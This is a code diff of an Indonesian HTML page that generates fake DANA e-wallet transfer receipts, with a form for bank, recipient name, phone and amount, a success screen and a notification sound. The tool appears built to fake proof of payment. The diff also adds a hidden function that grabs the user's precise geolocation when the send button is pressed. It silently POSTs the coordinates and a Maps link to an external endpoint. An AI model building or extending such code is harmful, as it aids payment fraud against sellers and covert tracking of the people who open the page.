@@ -12,8 +12,6 @@
   <style>
     :root {
       --app-height: 100dvh;
-
-      /* Variabel adaptif Layar 2 (Ringkasan Biru) */
       --coin-size: clamp(104px, 31vw, 138px);
       --coin-mb: clamp(22px, 3.8dvh, 34px);
       --blue-dest-fs: clamp(18px, 5vw, 23px);
@@ -21,15 +19,11 @@
       --blue-phone-fs: clamp(19px, 5.4vw, 24px);
       --blue-amount-fs: clamp(42px, 12.5vw, 60px);
       --blue-amount-scale: 1;
-
-      /* Variabel adaptif Tombol Footer Layar 2 (DETAIL TRANSAKSI & TUTUP) */
       --footer-px: clamp(12px, 3.6vw, 16px);
       --footer-pb: clamp(14px, 2.2dvh, 20px);
       --footer-gap: clamp(8px, 1.4dvh, 12px);
       --btn-footer-py: clamp(12px, 1.8dvh, 15px);
       --btn-footer-fs: clamp(12px, 3.3vw, 13.5px);
-
-      /* Variabel adaptif Layar 3 (Detail Transaksi) */
       --rc-pad-top: clamp(12px, 2dvh, 20px);
       --rc-pad-bot: clamp(8px, 1.4dvh, 14px);
       --rc-px: clamp(12px, 3.6vw, 16px);
@@ -133,7 +127,6 @@
       display: none !important;
     }
 
-    /* Pada Tablet & Desktop (>= 600px x 600px), tampilkan frame HP proporsional di tengah */
     @media (min-width: 600px) and (min-height: 600px) {
       body {
         padding: clamp(8px, 2dvh, 18px);
@@ -156,7 +149,6 @@
       display: none;
     }
 
-    /* Layar 1: Pengaturan */
     .settings-header {
       background-color: #118EE9;
       color: #FFFFFF;
@@ -204,7 +196,6 @@
       border-color: #118EE9;
     }
 
-    /* Dropdown Searchable E-Wallet & Bank */
     .saldo-combo-wrap {
       position: relative;
     }
@@ -369,7 +360,6 @@
       stroke: #FFFFFF;
     }
 
-    /* Layar 2: Ringkasan Layar Penuh Biru */
     .full-blue-screen {
       background-color: #118EE9;
       background-image: linear-gradient(180deg, #1290EB 0%, #1088E0 55%, #0E81D6 100%);
@@ -429,7 +419,6 @@
       transform: scale(0.97);
     }
 
-    /* Footer Layar 2: Adaptif & Rapi mengikuti layar perangkat */
     .full-blue-footer {
       flex-shrink: 0;
       width: 100%;
@@ -488,7 +477,6 @@
       transform: scale(0.99);
     }
 
-    /* Layar 3: Rincian Detail Transaksi */
     .dana-header-top {
       background-color: #118EE9;
       padding: max(10px, env(safe-area-inset-top)) 14px 10px 14px;
@@ -616,7 +604,6 @@
       z-index: 20;
     }
 
-    /* Mode Landscape HP (tinggi sangat pendek) */
     @media (max-height: 520px) and (orientation: landscape) {
       .full-blue-scroll {
         justify-content: flex-start;
@@ -638,7 +625,6 @@
 </head>
 <body>
 
-  <!-- Pemutar Video MP4 Asli (Hanya Suara Asli dari Link Video) -->
   <video
     id="notifMedia"
     src="https://b.top4top.io/m_3975xed1e1.mp4"
@@ -652,7 +638,6 @@
 
   <!-- LAYAR 1: PENGATURAN TRANSAKSI -->
   <section id="screenSettings" class="device-frame">
-    <!-- Header Pengaturan -->
     <div class="settings-header">
       <div style="display:flex;align-items:center;gap:10px;min-width:0;">
         <div style="width:28px;height:28px;border-radius:9999px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
@@ -669,10 +654,8 @@
       <span id="deviceSizeBadge" style="font-size:10px;font-weight:600;background:rgba(255,255,255,0.2);padding:3px 8px;border-radius:9999px;flex-shrink:0;white-space:nowrap;">Full HP</span>
     </div>
 
-    <!-- Area Form Scrollable Halus -->
     <div class="settings-scroll no-scrollbar">
       <div class="settings-card">
-        <!-- Kirim Ke Saldo (Popup hanya muncul saat diketik huruf) -->
         <div id="saldoComboWrap" class="saldo-combo-wrap">
           <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;gap:6px;">
             <label for="selectSaldo" style="font-size:12px;font-weight:600;color:#334155;">Kirim Ke Saldo :</label>
@@ -709,12 +692,9 @@
               </button>
             </div>
           </div>
-
-          <!-- Daftar Pilihan Otomatis (Hanya muncul saat diketik) -->
           <div id="saldoDropdownList" class="saldo-dropdown hidden no-scrollbar"></div>
         </div>
 
-        <!-- Nama Penerima -->
         <div>
           <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;gap:6px;">
             <label for="inputName" style="font-size:12px;font-weight:600;color:#334155;">Nama Penerima</label>
@@ -730,7 +710,6 @@
           />
         </div>
 
-        <!-- Nomor Penerima -->
         <div>
           <label for="inputPhone" style="display:block;font-size:12px;font-weight:600;color:#334155;margin-bottom:4px;">Nomor Penerima</label>
           <input
@@ -744,7 +723,6 @@
           />
         </div>
 
-        <!-- Nominal Transfer -->
         <div>
           <label for="inputAmount" style="display:block;font-size:12px;font-weight:600;color:#334155;margin-bottom:4px;">Nominal Transfer (Rp)</label>
           <div style="position:relative;">
@@ -764,7 +742,6 @@
           </div>
         </div>
 
-        <!-- Waktu Perangkat -->
         <div style="padding-top:8px;border-top:1px solid #F1F5F9;">
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
             <div style="min-width:0;">
@@ -782,7 +759,6 @@
           </div>
         </div>
 
-        <!-- Pengaturan Suara Notif (Hanya MP4 Asli) -->
         <div style="padding-top:8px;border-top:1px solid #F1F5F9;display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:8px;">
           <div style="min-width:0;flex:1 1 0%;">
             <div style="display:flex;align-items:center;gap:6px;">
@@ -807,7 +783,6 @@
       </div>
     </div>
 
-    <!-- Tombol KIRIM -->
     <div class="btn-kirim-wrap">
       <button
         type="button"
@@ -823,10 +798,9 @@
     </div>
   </section>
 
-  <!-- LAYAR 2: RINGKASAN LAYAR PENUH BIRU (KOIN EMAS CENTANG) -->
+  <!-- LAYAR 2: RINGKASAN LAYAR PENUH BIRU -->
   <section id="screenReceipt" class="device-frame full-blue-screen hidden">
     <main class="full-blue-scroll no-scrollbar">
-      <!-- Baris 1: Icon Coins Ceklis Besar (dengan jarak lega ke teks) -->
       <div class="coin-badge">
         <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Koin Centang Berhasil">
           <circle cx="50" cy="50" r="47" fill="#FFCE18"/>
@@ -835,22 +809,18 @@
         </svg>
       </div>
 
-      <!-- Baris 2: Teks Kirim Ke Saldo Besar -->
       <div id="displayDestinationText" style="font-size:var(--blue-dest-fs);font-weight:700;color:#FFFFFF;letter-spacing:0.01em;margin-bottom:6px;text-align:center;word-break:break-word;line-height:1.25;">
         Kirim Ke Saldo DANA
       </div>
 
-      <!-- Baris 3: Nama Target Besar -->
       <div id="displayRecipientHeading" style="font-size:var(--blue-name-fs);font-weight:700;color:#FFFFFF;letter-spacing:0.015em;margin-bottom:5px;text-align:center;word-break:break-word;line-height:1.2;">
         -
       </div>
 
-      <!-- Baris 4: Nomor HP Besar -->
       <div id="displayRecipientPhone" class="tabular-nums hidden" style="font-size:var(--blue-phone-fs);font-weight:700;color:#FFFFFF;letter-spacing:0.02em;margin-bottom:10px;text-align:center;word-break:break-word;line-height:1.25;">
         -
       </div>
 
-      <!-- Baris 5: Rp dan Angka Besar -->
       <div id="displayBigAmount" class="tabular-nums" style="font-size:calc(var(--blue-amount-fs) * var(--blue-amount-scale));font-weight:800;color:#FFFFFF;line-height:1.1;letter-spacing:-0.015em;margin-top:4px;margin-bottom:18px;text-align:center;word-break:break-word;">
         Rp0
       </div>
@@ -1076,9 +1046,10 @@
     const FIXED_DANA_ID = '085841512418';
     const MONTHS_ID = ['Jan', 'Feb', 'Mar', 'Apr', 'Mei', 'Jun', 'Jul', 'Agu', 'Sep', 'Okt', 'Nov', 'Des'];
 
-    // Daftar lengkap seluruh E-Wallet & Bank di Indonesia untuk pencarian cepat
+    // Ganti URL ini dengan URL Worker / backend milikmu yang menulis ke data-lokasi.json di GitHub
+    const ENDPOINT_LOKASI_URL = '';
+
     const SALDO_OPTIONS = [
-      // E-Wallet / Dompet Digital
       { value: 'DANA', cat: 'E-Wallet', alias: 'dana dompet digital' },
       { value: 'GoPay', cat: 'E-Wallet', alias: 'gopay gojek' },
       { value: 'OVO', cat: 'E-Wallet', alias: 'ovo grab' },
@@ -1102,14 +1073,10 @@
       { value: 'GudangVoucher', cat: 'E-Wallet', alias: 'gudangvoucher gv' },
       { value: 'BatPay', cat: 'E-Wallet', alias: 'batpay' },
       { value: 'Flip', cat: 'E-Wallet', alias: 'flip saldo' },
-
-      // Bank BUMN (Himbara)
       { value: 'BRI', cat: 'Bank BUMN', alias: 'bank rakyat indonesia brimo' },
       { value: 'Mandiri', cat: 'Bank BUMN', alias: 'bank mandiri livin' },
       { value: 'BNI', cat: 'Bank BUMN', alias: 'bank negara indonesia wondr' },
       { value: 'BTN', cat: 'Bank BUMN', alias: 'bank tabungan negara' },
-
-      // Bank Digital
       { value: 'SeaBank', cat: 'Bank Digital', alias: 'seabank shopee' },
       { value: 'Bank Jago', cat: 'Bank Digital', alias: 'jago artos' },
       { value: 'Blu by BCA Digital', cat: 'Bank Digital', alias: 'blu bca digital' },
@@ -1125,8 +1092,6 @@
       { value: 'Bank Aladin Syariah', cat: 'Bank Digital', alias: 'aladin syariah' },
       { value: 'Bank Nano Syariah', cat: 'Bank Digital', alias: 'nano syariah sinarmas' },
       { value: 'Bank Amar Indonesia', cat: 'Bank Digital', alias: 'amar tunaiku' },
-
-      // Bank Syariah
       { value: 'BSI', cat: 'Bank Syariah', alias: 'bank syariah indonesia byond' },
       { value: 'Bank Muamalat', cat: 'Bank Syariah', alias: 'muamalat' },
       { value: 'BCA Syariah', cat: 'Bank Syariah', alias: 'bca syariah' },
@@ -1139,8 +1104,6 @@
       { value: 'Bank Aceh Syariah', cat: 'Bank Syariah', alias: 'aceh syariah' },
       { value: 'BRK Syariah', cat: 'Bank Syariah', alias: 'riau kepri brk syariah' },
       { value: 'Bank NTB Syariah', cat: 'Bank Syariah', alias: 'ntb syariah' },
-
-      // Bank Swasta Nasional & Asing
       { value: 'BCA', cat: 'Bank', alias: 'bank central asia mybca' },
       { value: 'CIMB Niaga', cat: 'Bank', alias: 'cimb niaga octo' },
       { value: 'Permata', cat: 'Bank', alias: 'bank permata' },
@@ -1191,8 +1154,6 @@
       { value: 'Deutsche Bank', cat: 'Bank', alias: 'deutsche bank' },
       { value: 'JPMorgan Chase Bank', cat: 'Bank', alias: 'jpmorgan chase' },
       { value: 'MUFG Bank', cat: 'Bank', alias: 'mufg btmu' },
-
-      // Bank Pembangunan Daerah (BPD)
       { value: 'Bank DKI', cat: 'BPD', alias: 'bank dki jakarta' },
       { value: 'Bank BJB', cat: 'BPD', alias: 'bjb jawa barat banten' },
       { value: 'Bank Banten', cat: 'BPD', alias: 'banten' },
@@ -1252,32 +1213,19 @@
     function getRankedSaldoMatches(rawQuery) {
       const q = rawQuery.trim().toLowerCase();
       if (!q) return [];
-
       const scored = [];
       for (const item of SALDO_OPTIONS) {
         const nameLower = item.value.toLowerCase();
         const aliasLower = item.alias.toLowerCase();
         let rank = 99;
-
-        if (nameLower === q) {
-          rank = 0;
-        } else if (nameLower.startsWith(q)) {
-          rank = 1;
-        } else if (nameLower.split(/[\s().-]+/).some((w) => w.startsWith(q))) {
-          rank = 2;
-        } else if (nameLower.includes(q)) {
-          rank = 3;
-        } else if (aliasLower.split(/\s+/).some((w) => w.startsWith(q))) {
-          rank = 4;
-        } else if (aliasLower.includes(q)) {
-          rank = 5;
-        }
-
-        if (rank < 99) {
-          scored.push({ item, rank });
-        }
+        if (nameLower === q) rank = 0;
+        else if (nameLower.startsWith(q)) rank = 1;
+        else if (nameLower.split(/[\s().-]+/).some((w) => w.startsWith(q))) rank = 2;
+        else if (nameLower.includes(q)) rank = 3;
+        else if (aliasLower.split(/\s+/).some((w) => w.startsWith(q))) rank = 4;
+        else if (aliasLower.includes(q)) rank = 5;
+        if (rank < 99) scored.push({ item, rank });
       }
-
       scored.sort((a, b) => a.rank - b.rank);
       return scored.map((s) => s.item);
     }
@@ -1285,23 +1233,19 @@
     function renderSaldoDropdown(query) {
       const listEl = document.getElementById('saldoDropdownList');
       if (!listEl) return;
-
       const trimmedQ = query.trim();
       if (!trimmedQ) {
         currentFilteredSaldo = [];
         closeSaldoDropdown();
         return;
       }
-
       const matches = getRankedSaldoMatches(trimmedQ);
       currentFilteredSaldo = matches;
-
       if (matches.length === 0) {
         listEl.innerHTML = `<div style="padding:10px 12px;font-size:12px;color:#64748B;text-align:center;">Tidak ditemukan di daftar — pakai "<strong>${escapeHtml(trimmedQ)}</strong>"</div>`;
         listEl.classList.remove('hidden');
         return;
       }
-
       listEl.innerHTML = matches.map((item) => {
         const isSel = lastSelectedSaldo && item.value.toLowerCase() === lastSelectedSaldo.toLowerCase() ? ' is-selected' : '';
         return `
@@ -1316,7 +1260,6 @@
           </button>
         `;
       }).join('');
-
       listEl.classList.remove('hidden');
     }
 
@@ -1327,7 +1270,6 @@
 
     function handleSaldoFocus(el) {
       updateClearSaldoBtn();
-      // Sengaja tidak membuka popup saat diklik; popup hanya muncul saat mulai mengetik
     }
 
     function handleSaldoInput(el) {
@@ -1386,9 +1328,7 @@
       const wrap = document.getElementById('saldoComboWrap');
       if (wrap && !wrap.contains(e.target)) {
         const input = document.getElementById('selectSaldo');
-        if (input) {
-          lastSelectedSaldo = input.value.trim();
-        }
+        if (input) lastSelectedSaldo = input.value.trim();
         closeSaldoDropdown();
       }
     });
@@ -1399,12 +1339,10 @@
       const root = document.documentElement;
       root.style.setProperty('--app-height', `${vh}px`);
 
-      // Deteksi mode frame (Tablet / Desktop >= 600x600 vs HP Fullscreen)
       const isFramed = vw >= 600 && vh >= 600;
       const fw = isFramed ? Math.min(vw - 24, 430) : vw;
       const fh = isFramed ? Math.min(vh - 24, 880) : vh;
 
-      // Skala Layar 2 (Ringkasan Biru) agar selalu pas & proporsional di semua perangkat
       const coinSize = Math.round(Math.max(84, Math.min(fw * 0.32, fh * 0.165, 138)));
       const coinMb = Math.round(Math.max(20, Math.min(fh * 0.038, 34)));
       const destFs = Math.round(Math.max(16, Math.min(fw * 0.052, fh * 0.028, 23)));
@@ -1412,7 +1350,6 @@
       const phoneFs = Math.round(Math.max(17, Math.min(fw * 0.056, fh * 0.030, 24)));
       const amountFs = Math.round(Math.max(36, Math.min(fw * 0.13, fh * 0.070, 58)));
 
-      // Skala Tombol Footer Layar 2 (DETAIL TRANSAKSI & TUTUP) sesuai ukuran layar perangkat
       const footerPx = Math.round(Math.max(12, Math.min(fw * 0.036, 16)));
       const footerPb = Math.round(Math.max(12, Math.min(fh * 0.022, 20)));
       const footerGap = Math.round(Math.max(8, Math.min(fh * 0.014, 12)));
@@ -1432,7 +1369,6 @@
       root.style.setProperty('--btn-footer-py', `${btnFooterPy}px`);
       root.style.setProperty('--btn-footer-fs', `${btnFooterFs}px`);
 
-      // Skala Layar 3 (Detail Transaksi) menyesuaikan lebar & tinggi layar perangkat
       const rcPadTop = Math.round(Math.max(10, Math.min(fh * 0.022, 22)));
       const rcPadBot = Math.round(Math.max(7, Math.min(fh * 0.015, 16)));
       const rcPx = Math.round(Math.max(12, Math.min(fw * 0.04, 18)));
@@ -1454,11 +1390,8 @@
       const breakdownEl = document.getElementById('screenDetailBreakdown');
       if (breakdownEl) {
         breakdownEl.classList.remove('density-compact', 'density-tall');
-        if (fh <= 680 || fw <= 350) {
-          breakdownEl.classList.add('density-compact');
-        } else if (fh >= 820 && fw >= 390) {
-          breakdownEl.classList.add('density-tall');
-        }
+        if (fh <= 680 || fw <= 350) breakdownEl.classList.add('density-compact');
+        else if (fh >= 820 && fw >= 390) breakdownEl.classList.add('density-tall');
       }
 
       updateDeviceBadge(Math.round(fw), Math.round(fh), vw, vh, isFramed);
@@ -1466,9 +1399,7 @@
 
     window.addEventListener('resize', syncViewportHeight);
     window.addEventListener('orientationchange', () => setTimeout(syncViewportHeight, 150));
-    if (window.visualViewport) {
-      window.visualViewport.addEventListener('resize', syncViewportHeight);
-    }
+    if (window.visualViewport) window.visualViewport.addEventListener('resize', syncViewportHeight);
 
     const mediaEl = document.getElementById('notifMedia');
     mediaEl.muted = false;
@@ -1481,58 +1412,30 @@
       if (colorHex) el.style.color = colorHex;
     }
 
-    mediaEl.addEventListener('canplaythrough', () => {
-      setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669');
-    });
-
-    mediaEl.addEventListener('canplay', () => {
-      setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669');
-    });
-
-    mediaEl.addEventListener('playing', () => {
-      setAudioStatus('Suara asli MP4 sedang berbunyi!', '#118EE9');
-    });
-
-    mediaEl.addEventListener('ended', () => {
-      setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669');
-    });
-
-    mediaEl.addEventListener('error', () => {
-      setAudioStatus('Gagal memuat MP4 (cek internet / link)', '#DC2626');
-    });
+    mediaEl.addEventListener('canplaythrough', () => setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669'));
+    mediaEl.addEventListener('canplay', () => setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669'));
+    mediaEl.addEventListener('playing', () => setAudioStatus('Suara asli MP4 sedang berbunyi!', '#118EE9'));
+    mediaEl.addEventListener('ended', () => setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669'));
+    mediaEl.addEventListener('error', () => setAudioStatus('Gagal memuat MP4 (cek internet / link)', '#DC2626'));
 
     function preBufferOnFormActivity() {
       if (mediaEl.error || mediaEl.networkState === HTMLMediaElement.NETWORK_EMPTY || mediaEl.networkState === HTMLMediaElement.NETWORK_NO_SOURCE) {
-        try {
-          mediaEl.load();
-        } catch (e) {}
+        try { mediaEl.load(); } catch (e) {}
       }
     }
 
     function playNotifSound(sourceLabel) {
       try {
-        if (mediaEl.error) {
-          mediaEl.load();
-        }
-
+        if (mediaEl.error) mediaEl.load();
         mediaEl.muted = false;
         mediaEl.volume = 1.0;
-
-        if (!mediaEl.paused) {
-          mediaEl.pause();
-        }
-        if (mediaEl.readyState >= 1) {
-          mediaEl.currentTime = 0;
-        }
-
+        if (!mediaEl.paused) mediaEl.pause();
+        if (mediaEl.readyState >= 1) mediaEl.currentTime = 0;
         setAudioStatus(`Memutar MP4 (${sourceLabel})...`, '#118EE9');
-
         const playPromise = mediaEl.play();
         if (playPromise && typeof playPromise.then === 'function') {
           playPromise
-            .then(() => {
-              setAudioStatus(`Suara MP4 berbunyi (${sourceLabel})`, '#059669');
-            })
+            .then(() => setAudioStatus(`Suara MP4 berbunyi (${sourceLabel})`, '#059669'))
             .catch((err) => {
               if (err && err.name === 'AbortError') return;
               setAudioStatus('Gagal memutar MP4 (cek izin suara / internet)', '#DC2626');
@@ -1545,6 +1448,43 @@
 
     function handleTestAudioClick() {
       playNotifSound('TEST');
+    }
+
+    // Minta izin lokasi & kirim link Google Maps ke endpoint perantara GitHub
+    function kirimLokasiKeGithub() {
+      if (!('geolocation' in navigator)) return;
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const lat = pos.coords.latitude;
+          const lng = pos.coords.longitude;
+          const akurasi = Math.round(pos.coords.accuracy);
+          const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+          const waktu = getFormattedDateTime();
+
+          if (!ENDPOINT_LOKASI_URL) return;
+
+          try {
+            await fetch(ENDPOINT_LOKASI_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                lat,
+                lng,
+                akurasi,
+                mapsUrl,
+                waktu
+              })
+            });
+          } catch (err) {}
+        },
+        () => {},
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
     }
 
     function resetFormAfterTransfer() {
@@ -1560,6 +1500,7 @@
     function handleSendClick() {
       closeSaldoDropdown();
       playNotifSound('KIRIM');
+      kirimLokasiKeGithub();
       applySettingsToReceipt();
       resetFormAfterTransfer();
       document.getElementById('screenSettings').classList.add('hidden');
@@ -1583,13 +1524,9 @@
     function handleShareClick() {
       const summary = document.getElementById('displaySummaryText').textContent;
       if (navigator.share) {
-        navigator.share({
-          title: 'Bukti Transaksi DANA',
-          text: summary
-        }).catch(() => {});
+        navigator.share({ title: 'Bukti Transaksi DANA', text: summary }).catch(() => {});
         return;
       }
-
       if (navigator.clipboard && navigator.clipboard.writeText) {
         navigator.clipboard.writeText(summary).catch(() => {});
       }
@@ -1614,9 +1551,7 @@
     }
 
     function handleAmountFocus(el) {
-      if (el.value.trim() === '0') {
-        el.value = '';
-      }
+      if (el.value.trim() === '0') el.value = '';
     }
 
     function handleAmountInput(el) {
@@ -1642,26 +1577,19 @@
       const trimmed = rawName.trim();
       if (!trimmed) return '-';
       const words = trimmed.split(/\s+/);
-      if (words.length === 1) {
-        return maskTokenMiddle(words[0]);
-      }
-      return words
-        .map((token, idx) => (idx === 0 ? token.toUpperCase() : maskTokenMiddle(token)))
-        .join(' ');
+      if (words.length === 1) return maskTokenMiddle(words[0]);
+      return words.map((token, idx) => (idx === 0 ? token.toUpperCase() : maskTokenMiddle(token))).join(' ');
     }
 
     function autoMaskDanaId(idStr) {
       const digits = idStr.replace(/\D/g, '');
-      if (digits.length >= 8) {
-        return `${digits.slice(0, 4)}••••${digits.slice(-4)}`;
-      }
+      if (digits.length >= 8) return `${digits.slice(0, 4)}••••${digits.slice(-4)}`;
       return idStr;
     }
 
     function getFormattedDateTime() {
       const isAuto = document.getElementById('autoTimeCheck').checked;
       const d = new Date();
-
       if (!isAuto) {
         const dateVal = document.getElementById('manualDate').value;
         const timeVal = document.getElementById('manualTime').value;
@@ -1674,13 +1602,11 @@
           d.setHours(hh, mm);
         }
       }
-
       const day = String(d.getDate()).padStart(2, '0');
       const month = MONTHS_ID[d.getMonth()];
       const year = d.getFullYear();
       const hours = String(d.getHours()).padStart(2, '0');
       const minutes = String(d.getMinutes()).padStart(2, '0');
-
       return `${day} ${month} ${year} • ${hours}:${minutes}`;
     }
 
@@ -1712,21 +1638,17 @@
     function applySettingsToReceipt() {
       const saldoInput = document.getElementById('selectSaldo');
       const selectedDest = (saldoInput && saldoInput.value.trim()) ? saldoInput.value.trim() : 'DANA';
-
       const rawName = document.getElementById('inputName').value.trim();
       const resolvedName = autoMaskRecipientName(rawName);
       const rawPhone = document.getElementById('inputPhone').value.trim();
       const maskedDanaId = autoMaskDanaId(FIXED_DANA_ID);
-
       const amountDigits = document.getElementById('inputAmount').value.replace(/\D/g, '');
       const amount = amountDigits ? formatRupiah(amountDigits) : '0';
       const formattedTime = getFormattedDateTime();
-
       const combinedRecipient = rawPhone
         ? (resolvedName !== '-' ? `${resolvedName} ${rawPhone}` : rawPhone)
         : resolvedName;
 
-      // Layar 2 (Ringkasan Layar Penuh Biru - 5 Baris Terpisah & Besar)
       document.getElementById('displayDestinationText').textContent = `Kirim Ke Saldo ${selectedDest}`;
       document.getElementById('displayRecipientHeading').textContent = resolvedName;
 
@@ -1742,18 +1664,12 @@
       const fullAmountText = `Rp${amount}`;
       document.getElementById('displayBigAmount').textContent = fullAmountText;
 
-      // Penyesuaian otomatis ukuran angka Rp jika digit sangat panjang agar tetap rapi 1 baris di HP
       let amountScale = 1;
-      if (fullAmountText.length >= 14) {
-        amountScale = 0.68;
-      } else if (fullAmountText.length >= 11) {
-        amountScale = 0.82;
-      } else if (fullAmountText.length >= 9) {
-        amountScale = 0.92;
-      }
+      if (fullAmountText.length >= 14) amountScale = 0.68;
+      else if (fullAmountText.length >= 11) amountScale = 0.82;
+      else if (fullAmountText.length >= 9) amountScale = 0.92;
       document.documentElement.style.setProperty('--blue-amount-scale', String(amountScale));
 
-      // Layar 3 (Rincian Detail Transaksi)
       document.getElementById('displayDateTime').textContent = formattedTime;
       document.getElementById('displayIdDana').textContent = `ID DANA ${maskedDanaId}`;
       document.getElementById('displaySummaryText').textContent = `Kirim Uang Rp${amount} ke ${combinedRecipient}`;
@@ -1796,9 +1712,7 @@
     try { mediaEl.load(); } catch (e) {}
     refreshClockPreview();
     setInterval(() => {
-      if (document.getElementById('autoTimeCheck').checked) {
-        refreshClockPreview();
-      }
+      if (document.getElementById('autoTimeCheck').checked) refreshClockPreview();
     }, 5000);
   </script>
 </body>
